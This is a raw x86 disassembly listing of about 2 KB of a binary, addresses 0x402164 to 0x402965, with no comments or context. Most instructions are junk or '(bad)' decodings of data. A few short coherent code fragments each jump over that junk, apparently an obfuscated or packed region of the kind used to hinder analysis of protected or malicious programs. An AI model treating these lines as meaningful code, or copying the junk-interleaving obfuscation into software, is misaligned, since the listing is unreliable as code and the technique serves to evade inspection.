  402164:	jno    0x402191
  402166:	push   ds
  402167:	mov    ch,0x76
  402169:	push   esp
  40216a:	lds    eax,FWORD PTR [edx+0x36]
  40216d:	push   ds
  40216e:	add    bh,BYTE PTR [esi+0x7e]
  402171:	cli    
  402172:	jg     0x4021f2
  402174:	jle    0x4021b2
  402176:	mov    DWORD PTR [eax-0x10],ecx
  402179:	mov    bh,al
  40217b:	into   
  40217c:	out    0x2d,eax
  40217e:	xchg   BYTE PTR [ebp+0x7a1abf27],al
  402184:	cmp    BYTE PTR [edx],ah
  402186:	enter  0x2f5e,0xe8
  40218a:	test   eax,0x812fab6d
  40218f:	jl     0x4021c4
  402191:	pushf  
  402192:	popf   
  402193:	repz (bad) 
  402195:	jns    0x4021a3
  402197:	jb     0x402179
  402199:	stos   BYTE PTR es:[edi],al
  40219a:	jbe    0x40219f
  40219c:	test   eax,0x3567bdb9
  4021a1:	add    ebx,esi
  4021a3:	or     eax,0x66cddb1b
  4021a8:	call   0x7a298553
  4021ad:	shl    DWORD PTR [edi],cl
  4021af:	mov    esp,0x4290e4c0
  4021b4:	test   eax,0x9a890d4d
  4021b9:	xchg   ebx,eax
  4021ba:	pslld  mm1,QWORD PTR [ebx-0x60a0d295]
  4021c1:	cmp    eax,0xb81b7829
  4021c6:	retf   0xa2b4
  4021c9:	xor    eax,DWORD PTR [edi+edx*1]
  4021cc:	sbb    dl,dh
  4021ce:	int3   
  4021cf:	xor    BYTE PTR [ebp+0x62],cl
  4021d2:	pusha  
  4021d3:	hlt    
  4021d4:	popa   
  4021d5:	repnz lahf 
  4021d7:	xor    BYTE PTR [ebx+ebp*4],cl
  4021da:	push   0xfcdeaff8
  4021df:	mov    dh,0xde
  4021e1:	xchg   ecx,eax
  4021e2:	or     DWORD PTR [ebx+0x4b],esi
  4021e5:	mov    edx,0x3db97b4d
  4021ea:	loop   0x40217a
  4021ec:	(bad)  
  4021ed:	xlat   BYTE PTR ds:[ebx]
  4021ee:	mov    ch,0x36
  4021f0:	cmp    al,0xd5
  4021f2:	mov    edx,0xab8d6afc
  4021f7:	fidivr WORD PTR [edi-0x364898bc]
  4021fd:	stos   BYTE PTR es:[edi],al
  4021fe:	out    0x5a,al
  402200:	dec    ebx
  402201:	dec    edx
  402202:	push   0xffffff96
  402204:	in     eax,0x65
  402206:	cmp    BYTE PTR [edx+0x44],cl
  402209:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40220a:	jp     0x402273
  40220c:	(bad)  
  40220e:	adc    bl,BYTE PTR [ecx-0x20d867f6]
  402214:	in     al,dx
  402215:	sub    BYTE PTR [edi-0x3e],cl
  402218:	enter  0x5005,0xd0
  40221c:	test   eax,0x25d7670c
  402221:	(bad)  
  402222:	aas    
  402223:	sub    esi,DWORD PTR [edx]
  402225:	cs pop esp
  402227:	retf   0xb435
  40222a:	lahf   
  40222b:	in     al,dx
  40222c:	ret    
  40222d:	fwait
  40222e:	and    al,0xde
  402230:	cmp    eax,0xb02a1aaa
  402235:	xor    esi,ebx
  402237:	daa    
  402238:	xor    bh,0x28
  40223b:	cmp    BYTE PTR [esi-0x5c],al
  40223e:	cdq    
  40223f:	scas   eax,DWORD PTR es:[edi]
  402240:	and    eax,0x53e7b7ee
  402245:	in     eax,dx
  402246:	mul    BYTE PTR [edi]
  402248:	into   
  402249:	lods   eax,DWORD PTR ds:[esi]
  40224a:	mov    eax,DWORD PTR [edi]
  40224c:	xchg   ebx,eax
  40224d:	cmp    dl,BYTE PTR [eax-0x70dcc5d7]
  402253:	pop    ds
  402254:	int    0xd2
  402256:	stos   BYTE PTR es:[edi],al
  402257:	xor    eax,0xcc9a6092
  40225c:	and    bl,BYTE PTR [esp+ebp*4-0x6ee8f4d2]
  402263:	mov    ebx,0x5c3f9571
  402268:	(bad)  
  40226a:	imul   ebx,esp,0xec464767
  402270:	dec    ebp
  402271:	push   edi
  402272:	inc    ebp
  402273:	sbb    bl,BYTE PTR [ecx+0xe5349e4]
  402279:	mov    cl,BYTE PTR [esi]
  40227b:	sub    eax,DWORD PTR [edi-0x682aa2ed]
  402281:	mov    ah,0x4c
  402283:	js     0x4022be
  402285:	jno    0x40220e
  402287:	lahf   
  402288:	mov    al,0x18
  40228a:	pop    esi
  40228b:	movaps xmm3,xmm2
  40228e:	mov    edi,DWORD PTR [eax+0x30951c46]
  402294:	sbb    al,0xab
  402296:	mov    bl,0x57
  402298:	jo     0x4022a4
  40229a:	add    esi,edi
  40229c:	push   esi
  40229d:	out    0x10,al
  40229f:	test   al,0x4b
  4022a1:	adc    dl,BYTE PTR [edi-0x45]
  4022a4:	pop    esp
  4022a5:	js     0x402249
  4022a7:	fcomp  QWORD PTR [esi-0x20]
  4022aa:	lods   al,BYTE PTR ds:[esi]
  4022ab:	jb     0x40223f
  4022ad:	or     DWORD PTR [eax-0x98333c9],ecx
  4022b3:	imul   ebx,DWORD PTR [edx-0x18387029],0xffffff8a
  4022ba:	pop    eax
  4022bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022bc:	sbb    ecx,edi
  4022be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4022bf:	mov    edi,0x3e847f06
  4022c4:	xor    esi,esp
  4022c6:	sbb    BYTE PTR gs:[edi],0x2f
  4022ca:	fdivr  DWORD PTR [ecx+ebx*2+0x36a208f6]
  4022d1:	mov    esi,0x705e6da9
  4022d6:	or     ecx,DWORD PTR [edi]
  4022d8:	or     eax,0xb5485e1e
  4022dd:	gs js  0x402352
  4022e0:	add    DWORD PTR [eax-0x7b8219ce],esp
  4022e6:	xor    DWORD PTR [edx],ebx
  4022e8:	xor    DWORD PTR [edx-0x5c],eax
  4022eb:	pop    eax
  4022ec:	cld    
  4022ed:	add    DWORD PTR [eax+0x7bcbba04],ebp
  4022f3:	cmp    cl,dh
  4022f5:	or     eax,0x5086481e
  4022fa:	mov    eax,DWORD PTR [ebp-0x18]
  4022fd:	mov    eax,DWORD PTR [eax+0x198]
  402303:	push   DWORD PTR [eax]
  402305:	call   0x40984d
  40230a:	mov    DWORD PTR [ebp-0x4],eax
  40230d:	cmp    DWORD PTR [ebp-0x4],0x0
  402311:	lea    eax,[ebp+0x4]
  402314:	mov    DWORD PTR [ebp-0x38],eax
  402317:	je     0x40313f
  40231d:	lea    eax,[ebp-0xc]
  402320:	mov    DWORD PTR [ebp-0x30],eax
  402323:	mov    eax,DWORD PTR [ebp-0x4c]
  402326:	xor    eax,esi
  402328:	add    eax,edi
  40232a:	mov    DWORD PTR [ebp-0x34],eax
  40232d:	mov    eax,DWORD PTR [ebp-0x28]
  402330:	xor    eax,esi
  402332:	add    eax,edi
  402334:	mov    DWORD PTR [ebp-0x20],eax
  402337:	mov    eax,DWORD PTR [ebp-0x4]
  40233a:	mov    DWORD PTR [ebp-0x24],eax
  40233d:	lea    eax,[ebp-0x98]
  402343:	mov    DWORD PTR [ebp-0x8],eax
  402346:	jmp    0x4024e7
  40234b:	mov    ds:0x623e7a3a,al
  402350:	bound  esp,QWORD PTR ds:[edx-0x4a]
  402354:	fadd   DWORD PTR [ebp+0x4b]
  402357:	shr    DWORD PTR [ebx],cl
  402359:	xchg   edx,eax
  40235a:	cmp    al,0x9a
  40235c:	add    edi,DWORD PTR [esi+0x7e]
  40235f:	cli    
  402360:	jg     0x4023e0
  402362:	jle    0x4023de
  402364:	mov    bh,cl
  402366:	pushf  
  402367:	adc    al,cl
  402369:	nop
  40236a:	xchg   ebp,eax
  40236b:	out    0x72,al
  40236d:	data16 jecxz 0x402397
  402370:	dec    esi
  402371:	sub    al,0x1d
  402373:	xchg   ebp,eax
  402374:	pop    eax
  402375:	xchg   ebp,eax
  402376:	push   ebp
  402377:	dec    esp
  402378:	dec    ebx
  402379:	mov    ebx,0xcfdaa81
  40237e:	enter  0x91b6,0x7c
  402382:	jbe    0x4023d7
  402384:	jmp    0x402320
  402386:	femms  
  402388:	sub    DWORD PTR [eax-0x18b1cda0],ebp
  40238e:	adc    BYTE PTR [edi],0xf1
  402391:	pop    ds
  402392:	packsswb mm4,QWORD PTR [esi-0x86ba8ef]
  402399:	ret    
  40239a:	pop    esp
  40239b:	cld    
  40239c:	mov    ecx,0xd9e20952
  4023a1:	xor    DWORD PTR [edi],edx
  4023a3:	adc    DWORD PTR [edx-0x2eac106b],edx
  4023a9:	(bad)  
  4023aa:	out    dx,eax
  4023ab:	int3   
  4023ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023ad:	call   0x42ec:0xfdcd8ed1
  4023b4:	mov    cl,0x1a
  4023b6:	hlt    
  4023b7:	popa   
  4023b8:	inc    edx
  4023b9:	nop
  4023ba:	icebp  
  4023bb:	arpl   WORD PTR [esi],di
  4023bd:	fs repz mov ebp,0xe141f9b2
  4023c4:	dec    edx
  4023c5:	mov    esi,0x24636ef8
  4023ca:	jl     0x402434
  4023cc:	mov    ds:0x9b3eb131,al
  4023d1:	adc    BYTE PTR [edx-0x6094b317],ch
  4023d7:	pop    es
  4023d8:	dec    eax
  4023d9:	test   BYTE PTR [eax],0x6c
  4023dc:	aad    0x9c
  4023de:	fbstp  TBYTE PTR [edi]
  4023e0:	mov    eax,ds:0x4599d140
  4023e5:	xchg   ebx,eax
  4023e6:	pop    esp
  4023e7:	sti    
  4023e8:	mov    cl,0x97
  4023ea:	and    al,0x1b
  4023ec:	cli    
  4023ed:	int    0x43
  4023ef:	cmp    ebx,DWORD PTR [ecx+0x35]
  4023f2:	lods   al,BYTE PTR ds:[esi]
  4023f3:	fadd   QWORD PTR cs:[ecx-0x7c456f7f]
  4023fa:	mov    edx,0x9948fe03
  4023ff:	sub    al,0x9d
  402401:	dec    edi
  402402:	in     al,dx
  402403:	xor    bh,BYTE PTR [eax]
  402405:	jbe    0x40241e
  402407:	cwde   
  402408:	scas   eax,DWORD PTR es:[edi]
  402409:	inc    ebp
  40240a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40240b:	sub    al,0x26
  40240d:	std    
  40240e:	int    0xf2
  402410:	shl    BYTE PTR [esi-0x33],cl
  402413:	stos   DWORD PTR es:[edi],eax
  402414:	sub    DWORD PTR [edx+0x5e],ecx
  402417:	fucomi st,st(5)
  402419:	les    ebp,FWORD PTR [edx-0x65]
  40241c:	cmp    BYTE PTR [esi+ecx*2],bl
  40241f:	out    0x64,eax
  402421:	ss in  eax,0x4e
  402424:	retf   0x24d1
  402427:	and    BYTE PTR [ebp-0x58],ah
  40242a:	loope  0x40249c
  40242c:	jecxz  0x40244b
  40242e:	cmp    DWORD PTR [ebx],0xd38248be
  402434:	mov    ds:0xd9dce717,al
  402439:	js     0x4024b4
  40243b:	and    ch,BYTE PTR [eax]
  40243d:	sbb    DWORD PTR [eax-0x70],0x994c1c51
  402444:	dec    eax
  402445:	cmpxchg DWORD PTR [ecx+edi*8-0x7535c4c8],ebp
  40244d:	inc    ecx
  40244e:	jae    0x4023ef
  402450:	loop   0x4024c9
  402452:	xchg   BYTE PTR [ecx-0x54e1d13a],dl
  402458:	xor    eax,0x6a25faac
  40245d:	je     0x4024a6
  40245f:	(bad)  
  402460:	sahf   
  402461:	mov    cl,0x49
  402463:	shl    BYTE PTR [ecx+0x44286139],0x1e
  40246a:	retf   
  40246b:	pop    ebx
  40246c:	in     eax,0x79
  40246e:	mov    ah,0xf8
  402470:	push   edx
  402471:	cs xchg ecx,eax
  402473:	les    edx,FWORD PTR [ebp-0x7a]
  402476:	cld    
  402477:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402478:	mov    bh,0x29
  40247a:	leave  
  40247b:	cli    
  40247c:	xor    eax,0xbdd0d3bb
  402481:	pop    edx
  402482:	sbb    dh,ch
  402484:	dec    esp
  402485:	or     BYTE PTR [ebx],dh
  402487:	loop   0x402502
  402489:	aaa    
  40248a:	push   esp
  40248b:	mov    esi,0x61a53e63
  402490:	out    dx,eax
  402491:	add    BYTE PTR [ecx+edi*4+0x2],bl
  402495:	inc    dl
  402497:	push   edi
  402498:	jmpw   0xc59a
  40249c:	fcmovb st,st(6)
  40249e:	test   eax,0x7c2dfb93
  4024a3:	jb     0x4024d9
  4024a5:	call   0x66e06781
  4024aa:	std    
  4024ab:	dec    ebx
  4024ac:	inc    ecx
  4024ad:	push   es
  4024ae:	out    0x39,al
  4024b0:	(bad)  
  4024b1:	mov    ds:0x5639cd57,eax
  4024b6:	dec    ecx
  4024b7:	mov    ds:0x7ec3c3b,eax
  4024bc:	mov    ds:0x4832242f,eax
  4024c1:	(bad)  
  4024c2:	popf   
  4024c3:	sbb    DWORD PTR [eax+0x25],ecx
  4024c6:	rcr    DWORD PTR [edi],cl
  4024c8:	mov    ecx,DWORD PTR [esi]
  4024ca:	retf   0x9817
  4024cd:	pusha  
  4024ce:	js     0x402456
  4024d0:	mov    BYTE PTR [ebx-0x2],dl
  4024d3:	sub    eax,DWORD PTR [ebx+0x29]
  4024d6:	idiv   BYTE PTR [edi]
  4024d8:	repz pop ecx
  4024da:	mov    al,BYTE PTR ds:0x5dede816
  4024e0:	pop    ebx
  4024e1:	xchg   esp,eax
  4024e2:	pop    ds
  4024e3:	inc    ebx
  4024e4:	es mov cl,0xb8
  4024e7:	mov    eax,DWORD PTR [ebp-0x10]
  4024ea:	mov    DWORD PTR [ebp-0x10],eax
  4024ed:	mov    eax,DWORD PTR [ebp-0x1c]
  4024f0:	mov    DWORD PTR [ebp-0x40],ebx
  4024f3:	mov    DWORD PTR [ebp-0x2c],eax
  4024f6:	mov    eax,DWORD PTR [ebp-0x40]
  4024f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4024fc:	jmp    0x40269d
  402501:	push   ebp
  402502:	shl    BYTE PTR [ebp+0x7159b138],1
  402508:	push   ecx
  402509:	stos   DWORD PTR es:[edi],eax
  40250a:	rol    eax,0x47
  40250d:	sbb    DWORD PTR [edx],ecx
  40250f:	lock ins BYTE PTR es:[edi],dx
  402511:	add    DWORD PTR es:[esi+0x7e],edi
  402515:	cli    
  402516:	jg     0x402596
  402518:	jle    0x402509
  40251a:	icebp  
  40251b:	arpl   bp,bp
  40251d:	rcr    DWORD PTR ds:0x91179017,cl
  402523:	sub    al,0xea
  402525:	int3   
  402526:	mov    ecx,0xce841f46
  40252b:	cdq    
  40252c:	sub    DWORD PTR [ebp-0x3f6deb90],edi
  402532:	(bad)  
  402533:	int3   
  402534:	push   ecx
  402535:	pop    ss
  402536:	outs   dx,DWORD PTR ds:[esi]
  402537:	fwait
  402538:	cdq    
  402539:	in     al,0xe7
  40253b:	push   ebp
  40253c:	scas   al,BYTE PTR es:[edi]
  40253d:	sbb    eax,0xb198ed7f
  402542:	rol    DWORD PTR [edx],cl
  402544:	pop    esi
  402545:	jecxz  0x40251e
  402547:	popf   
  402548:	dec    esp
  402549:	ret    0x4ce1
  40254c:	inc    ebx
  40254d:	es pop ebp
  40254f:	retf   
  402550:	loope  0x402562
  402552:	xacquire xchg BYTE PTR [edi+ebp*2-0x2a376f57],dh
  40255a:	mov    esp,0xf4e2e343
  40255f:	leave  
  402560:	add    al,0x39
  402562:	push   edx
  402564:	bound  ebx,QWORD PTR [ebx+eiz*2+0x28]
  402568:	and    ebx,DWORD PTR [esi+0x1b4d4465]
  40256e:	add    edi,DWORD PTR [edx-0x636f6db2]
  402574:	cld    
  402575:	scas   al,BYTE PTR es:[edi]
  402576:	cmc    
  402577:	fcomp  QWORD PTR [edx-0x28]
  40257a:	cdq    
  40257b:	adc    al,0xca
  40257d:	inc    ebx
  40257e:	(bad)  
  40257f:	push   ebx
  402580:	xchg   esp,eax
  402581:	mov    ebp,0xa000be71
  402586:	adc    eax,0xda0ccdc8
  40258b:	lahf   
  40258c:	or     ebx,DWORD PTR [ebp-0x13]
  40258f:	mov    edx,0x8029f97c
  402594:	js     0x4025dc
  402596:	and    eax,0xb8da69b0
  40259b:	add    eax,0x87a8fbb1
  4025a0:	test   BYTE PTR [esi+eiz*8],bh
  4025a3:	jg     0x4025aa
  4025a5:	adc    DWORD PTR [edi+0x4004fcaa],0x7b
  4025ac:	jno    0x4025f9
  4025ae:	adc    eax,0xcb4bbb52
  4025b3:	pop    es
  4025b4:	fisttp DWORD PTR [ebx+eax*4+0x7b]
  4025b8:	mov    ah,0x68
  4025ba:	mov    ebp,0x162b94e5
  4025bf:	bound  ecx,QWORD PTR [edx+0x3e]
  4025c2:	pop    edi
  4025c3:	xor    BYTE PTR [eax+0x664bae2b],0x3b
  4025ca:	mov    esp,0x12a3e90f
  4025cf:	test   eax,0x47b80744
  4025d4:	sub    BYTE PTR [eax+eax*1+0x1e1af9e7],0x6e
  4025dc:	jb     0x40260c
  4025de:	je     0x40260a
  4025e0:	jnp    0x402581
  4025e2:	cdq    
  4025e3:	(bad)  
  4025e4:	(bad)  
  4025e6:	fdivrp st(6),st
  4025e8:	fwait
  4025e9:	dec    ebx
  4025ea:	(bad)  
  4025eb:	push   0xffffffba
  4025ed:	mov    edi,0x904b00b
  4025f2:	out    dx,eax
  4025f3:	retf   0x1ed0
  4025f6:	inc    esp
  4025f7:	aad    0x24
  4025f9:	nop
  4025fa:	out    dx,al
  4025fb:	dec    edx
  4025fc:	mov    WORD PTR [ebp+0x7e737157],es
  402602:	sub    ebx,DWORD PTR [eax+ebp*2]
  402605:	hlt    
  402606:	inc    ebp
  402607:	mov    esi,0xd8c9ed83
  40260c:	jmp    0x8a50019a
  402611:	or     DWORD PTR [eax-0x38a0edfb],0x32da48da
  40261b:	cwde   
  40261c:	sub    dh,bl
  40261e:	mov    dh,0xa1
  402620:	or     BYTE PTR [eax+0x29ea1e6c],bh
  402626:	pop    es
  402627:	in     eax,0x5f
  402629:	or     ecx,DWORD PTR [esi+0x6f]
  40262c:	fstp   DWORD PTR [ebx+0x55]
  40262f:	lods   al,BYTE PTR ds:[esi]
  402630:	iret   
  402631:	add    eax,0x46ea4d3c
  402636:	lods   eax,DWORD PTR ds:[esi]
  402637:	xchg   edx,eax
  402638:	cld    
  402639:	cmp    DWORD PTR [ecx],edx
  40263b:	cdq    
  40263c:	push   esp
  40263d:	mov    dl,0xee
  40263f:	std    
  402640:	jmp    0x1cda:0x114e8d37
  402647:	jbe    0x4025e8
  402649:	pop    es
  40264a:	sbb    eax,0x2be0fa27
  40264f:	push   esi
  402650:	pop    edi
  402651:	mov    es:0xd72f40c6,eax
  402657:	outs   dx,BYTE PTR ds:[esi]
  402658:	xchg   ebp,eax
  402659:	popf   
  40265a:	mov    bl,0x52
  40265c:	push   es
  40265d:	jnp    0x40261e
  40265f:	push   0xffffffc4
  402661:	adc    DWORD PTR [edx+0x60c21558],edx
  402667:	or     DWORD PTR [ebx-0x6f947f6f],ebx
  40266d:	(bad)  
  40266e:	sub    al,0x5d
  402670:	adc    BYTE PTR [edx-0x5e],cl
  402673:	imul   BYTE PTR [edx]
  402675:	std    
  402676:	jno    0x402668
  402678:	out    0x41,eax
  40267a:	(bad)  
  40267b:	je     0x4026d3
  40267d:	adc    BYTE PTR [ebx-0x59],bh
  402680:	mov    eax,gs:0x9ae51860
  402686:	scas   al,BYTE PTR es:[edi]
  402687:	arpl   WORD PTR [ebp-0x4fdfdcec],dx
  40268d:	(bad)  
  40268e:	xchg   edx,eax
  40268f:	mov    ebx,DWORD PTR [eax+0x653ccfd7]
  402695:	add    ebp,esp
  402697:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402698:	pop    eax
  402699:	aad    0x0
  40269b:	mov    bh,0xd
  40269d:	xor    eax,esi
  40269f:	add    eax,0x32729b
  4026a4:	mov    DWORD PTR [ecx],eax
  4026a6:	mov    eax,DWORD PTR [ebp-0x24]
  4026a9:	mov    ecx,DWORD PTR [ebp-0x8]
  4026ac:	mov    DWORD PTR [ecx+0x4],eax
  4026af:	mov    eax,DWORD PTR [ebp-0x20]
  4026b2:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b5:	mov    DWORD PTR [ecx+0x8],eax
  4026b8:	mov    eax,DWORD PTR [ebp-0x34]
  4026bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4026be:	mov    DWORD PTR [ecx+0xc],eax
  4026c1:	jmp    0x402862
  4026c6:	les    ecx,FWORD PTR [eax+0x5552d502]
  4026cc:	ror    DWORD PTR [ecx-0x7d59e5d1],1
  4026d2:	aas    
  4026d3:	fmul   QWORD PTR [ebx+0x7e0ea286]
  4026d9:	jle    0x4026d5
  4026db:	jg     0x40275b
  4026dd:	jle    0x402701
  4026df:	push   eax
  4026e0:	loope  0x40269c
  4026e2:	(bad)  
  4026e3:	cmp    ebx,eax
  4026e5:	mov    al,0xf7
  4026e7:	repz mov ds:0xe65da8f6,al
  4026ed:	push   edx
  4026ee:	inc    ebp
  4026ef:	gs jae 0x402760
  4026f2:	xchg   edi,eax
  4026f3:	adc    esi,DWORD PTR [ebx]
  4026f5:	mov    edx,esp
  4026f7:	or     al,0x6c
  4026f9:	ret    0xdb2a
  4026fc:	jle    0x402750
  4026fe:	sahf   
  4026ff:	ss jl  0x4026d5
  402702:	lds    eax,FWORD PTR [edx-0x2621e30d]
  402708:	test   BYTE PTR [ebp*2-0x6aea7128],bl
  40270f:	xor    al,0x78
  402711:	jge    0x402745
  402713:	xchg   esi,eax
  402714:	dec    edi
  402715:	mov    al,ds:0x31fe2649
  40271a:	ficomp DWORD PTR [esp+edi*1]
  40271d:	imul   ebp,DWORD PTR [esi-0x4a],0xffffff83
  402721:	mov    esi,0x20296d01
  402726:	xchg   DWORD PTR [esi-0x4b20a06],edx
  40272c:	(bad)  
  40272d:	cmp    cl,ah
  40272f:	jge    0x4026f6
  402731:	jo     0x4026ce
  402733:	sbb    al,0xa2
  402735:	cmp    edx,ebp
  402737:	adc    bl,BYTE PTR [edx-0x32]
  40273a:	stc    
  40273b:	scas   al,BYTE PTR es:[edi]
  40273c:	shl    DWORD PTR [esi],0x93
  40273f:	leave  
  402740:	out    0x3,al
  402742:	push   es
  402743:	rcl    BYTE PTR [edi-0x21],cl
  402746:	les    edi,FWORD PTR [ebp-0x51]
  402749:	or     eax,esp
  40274b:	cwde   
  40274c:	pop    eax
  40274d:	ins    BYTE PTR es:[edi],dx
  40274e:	mov    bh,0x7e
  402750:	pop    ds
  402751:	pop    es
  402752:	push   0xca9505f3
  402757:	scas   al,BYTE PTR es:[edi]
  402758:	(bad)  
  40275a:	cmp    ebx,ebx
  40275c:	xchg   esp,eax
  40275d:	int3   
  40275e:	out    0x5c,al
  402760:	dec    esp
  402761:	mov    ah,0xd6
  402763:	xor    bh,BYTE PTR [esi-0x44]
  402766:	mov    eax,0x755a7d19
  40276b:	fnstenv [ebp-0x658d2327]
  402771:	shl    eax,cl
  402773:	ja     0x40276c
  402775:	add    al,0xaf
  402777:	fst    st(2)
  402779:	div    BYTE PTR [edx-0xf]
  40277c:	sbb    ah,BYTE PTR [edi-0x2236f5bb]
  402782:	jb     0x402751
  402784:	fneni(8087 only) 
  402786:	inc    edi
  402787:	pop    ds
  402788:	cwde   
  402789:	jp     0x402734
  40278b:	jl     0x4027fe
  40278d:	outs   dx,DWORD PTR ds:[esi]
  40278e:	sub    eax,0x6cccd262
  402793:	mov    WORD PTR [ecx],cs
  402795:	mov    ch,0xbe
  402797:	popf   
  402798:	fcomp  DWORD PTR [eax+0x189d7699]
  40279e:	adc    edi,DWORD PTR [esi]
  4027a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027a1:	and    BYTE PTR [esi+0x2bb4d3b9],0x5d
  4027a8:	pop    esi
  4027a9:	xchg   esi,eax
  4027aa:	pop    edi
  4027ab:	jg     0x402737
  4027ad:	push   ss
  4027ae:	or     eax,0x80009080
  4027b3:	iret   
  4027b4:	mov    ch,0x1f
  4027b6:	pusha  
  4027b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027b8:	fsubr  QWORD PTR [ecx]
  4027ba:	mov    ds:0x9505c512,eax
  4027bf:	push   esi
  4027c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027c1:	push   es
  4027c2:	aaa    
  4027c3:	mov    al,ds:0x191e259d
  4027c8:	cmp    eax,0x9fdc47b4
  4027cd:	(bad)  
  4027cf:	(bad)  
  4027d0:	call   0xfa36:0x552185df
  4027d7:	call   0xff28e000
  4027dc:	push   ebx
  4027dd:	in     eax,0x53
  4027df:	int    0x68
  4027e1:	daa    
  4027e2:	add    eax,0x7e3dfc32
  4027e7:	js     0x402787
  4027e9:	jg     0x4027c3
  4027eb:	outs   dx,DWORD PTR ds:[esi]
  4027ec:	sub    ebp,eax
  4027ee:	outs   dx,BYTE PTR ds:[esi]
  4027ef:	xchg   esp,eax
  4027f0:	icebp  
  4027f1:	stc    
  4027f2:	pop    ebp
  4027f3:	loop   0x4027ea
  4027f5:	inc    ecx
  4027f6:	fsub   QWORD PTR ds:0xd7adfe32
  4027fc:	repz mov eax,0x312eec56
  402802:	scas   al,BYTE PTR es:[edi]
  402803:	jp     0x402879
  402805:	in     eax,dx
  402806:	inc    ax
  402808:	(bad)  
  402809:	hlt    
  40280a:	mov    ecx,0xaa9a2e1c
  40280f:	iret   
  402810:	mov    ch,0x7
  402812:	mov    esp,0x401c0f00
  402817:	imul   edx,DWORD PTR [edi+ecx*2+0xb],0x1a
  40281c:	dec    esi
  40281d:	mov    al,ds:0x2cfe2c35
  402822:	sub    eax,0xc7904323
  402827:	xor    ebx,DWORD PTR ds:0xb10cbced
  40282d:	add    dh,BYTE PTR [edi+0x16fdd5f0]
  402833:	jge    0x402830
  402835:	jno    0x4027e1
  402837:	(bad)  
  402839:	sub    eax,0x698cd6a3
  40283e:	inc    edx
  40283f:	in     eax,0xf
  402841:	lock inc edi
  402843:	cmp    eax,DWORD PTR [ebp+ebp*1-0x2ecc900d]
  40284a:	ins    BYTE PTR es:[edi],dx
  40284b:	push   ecx
  40284c:	in     eax,dx
  40284d:	lods   al,BYTE PTR ds:[esi]
  40284e:	je     0x4028c7
  402850:	lea    ebx,[ebx-0x1662056]
  402856:	lods   al,BYTE PTR ds:[esi]
  402858:	rcl    DWORD PTR [edx+0x15cfde76],cl
  40285e:	cs mov eax,0x458b3da4
  402864:	ror    BYTE PTR [ebx+0x4189f84d],1
  40286a:	adc    BYTE PTR [ebx-0x23ba7440],cl
  402870:	test   eax,eax
  402872:	jmp    0x402a13
  402877:	inc    edi
  402878:	push   eax
  402879:	jnp    0x402883
  40287b:	or     DWORD PTR [ecx+0x55],edx
  40287e:	push   ecx
  40287f:	adc    BYTE PTR [ebx],ch
  402881:	nop
  402882:	dec    esp
  402883:	mov    edx,0x2ec78d03
  402888:	or     al,0x7e
  40288a:	jle    0x402886
  40288c:	jg     0x40290c
  40288e:	jle    0x402832
  402890:	inc    ecx
  402891:	mov    ebp,0x2c91f348
  402896:	push   es
  402897:	and    ah,0x5a
  40289a:	pushf  
  40289b:	stos   DWORD PTR es:[edi],eax
  40289c:	das    
  40289d:	out    0xb0,al
  40289f:	retf   0x5f32
  4028a2:	ds scas eax,DWORD PTR es:[edi]
  4028a4:	repnz or BYTE PTR [edx-0x46],ah
  4028a8:	pusha  
  4028a9:	(bad)  
  4028aa:	or     BYTE PTR [ebx+0xad6a7e7],dh
  4028b0:	jl     0x40289c
  4028b2:	sub    DWORD PTR [ecx-0x38584e3f],0xac604cf7
  4028bc:	cs ins BYTE PTR es:[edi],dx
  4028be:	in     al,0x5c
  4028c0:	dec    esi
  4028c1:	call   0xd4bf:0xb811cd96
  4028c8:	jae    0x40284a
  4028ca:	jno    0x4028f7
  4028cc:	pushf  
  4028cd:	icebp  
  4028ce:	xor    al,0x9a
  4028d0:	cmp    eax,0x5d61ceb
  4028d5:	imul   edi,DWORD PTR [eax],0x508b9f7f
  4028db:	or     al,0xc2
  4028dd:	ja     0x402934
  4028df:	aad    0x6e
  4028e1:	add    ecx,edx
  4028e3:	ret    0x9c53
  4028e6:	arpl   bp,di
  4028e8:	push   0x65df46c
  4028ed:	adc    BYTE PTR [esi-0x752fe780],0xc4
  4028f4:	or     DWORD PTR [edi+0x77681204],ebx
  4028fa:	inc    ecx
  4028fb:	sbb    bl,cl
  4028fd:	add    esi,DWORD PTR [edi+ebx*1]
  402900:	iret   
  402901:	out    dx,eax
  402902:	std    
  402903:	ret    
  402904:	jae    0x4028ec
  402906:	pop    edi
  402907:	adc    BYTE PTR [edx],0x42
  40290a:	sahf   
  40290b:	outs   dx,BYTE PTR ds:[esi]
  40290c:	scas   al,BYTE PTR es:[edi]
  40290d:	mov    esp,0xa2ea2c95
  402912:	xor    dh,ch
  402914:	adc    bl,BYTE PTR [ebp-0x4]
  402917:	cmc    
  402918:	mov    edx,0xe5c66ac2
  40291d:	dec    ebx
  40291e:	inc    edi
  40291f:	xchg   esi,eax
  402920:	ins    DWORD PTR es:[edi],dx
  402921:	outs   dx,DWORD PTR ds:[esi]
  402922:	jmp    0x239c:0xd499098
  402929:	or     al,0x75
  40292b:	xor    BYTE PTR [esi+0x5f],dl
  40292e:	push   ebp
  40292f:	sbb    ch,bl
  402931:	shl    DWORD PTR [edx-0x4],1
  402934:	mov    esp,0x5f48e740
  402939:	imul   edi,eax,0xfffffff6
  40293c:	mov    BYTE PTR [esi-0x327d9596],ch
  402942:	mov    dh,0x22
  402944:	push   0x2668ec62
  402949:	dec    eax
  40294a:	mov    ebx,0x3f3bdbaa
  40294f:	cwde   
  402950:	rcl    BYTE PTR [ecx+0x72],0xef
  402954:	sbb    BYTE PTR [ebx],al
  402956:	jmp    0x40297f
  402958:	(bad)  
  402959:	mov    esi,0x75a669f8
  40295e:	dec    esp
  40295f:	mov    ah,0xb2
  402961:	sbb    al,0x3e
  402963:	es pop edx
  402965:	rol    BYTE PTR [edx],1
